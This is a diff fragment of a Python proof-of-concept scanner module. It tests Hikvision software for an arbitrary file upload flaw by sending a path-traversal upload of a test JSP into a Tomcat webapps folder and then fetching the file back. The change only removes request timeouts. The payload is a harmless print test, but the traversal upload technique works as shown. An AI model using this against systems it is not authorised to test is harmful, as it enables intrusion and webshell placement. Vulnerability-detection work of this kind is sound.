@@ -48,10 +48,10 @@ class poc:
             '../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp', '<%out.print("test");%>', 'application/zip')
         }
         try:
-            result1 = requests.post(url=url1, files=data, headers=self.headers1, verify=False, timeout=3, proxies=self.proxies)
+            result1 = requests.post(url=url1, files=data, headers=self.headers1, verify=False, proxies=self.proxies)
             if "link" in result1.text:
                 url2 = result1.json()["data"]["link"]
-                result2 = requests.get(url=url2, headers=self.headers2, verify=False, timeout=3, proxies=self.proxies)
+                result2 = requests.get(url=url2, headers=self.headers2, verify=False, proxies=self.proxies)
                 if result2.status_code == 200 and "test" in result2.text:
                     target = urlparse(url1)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
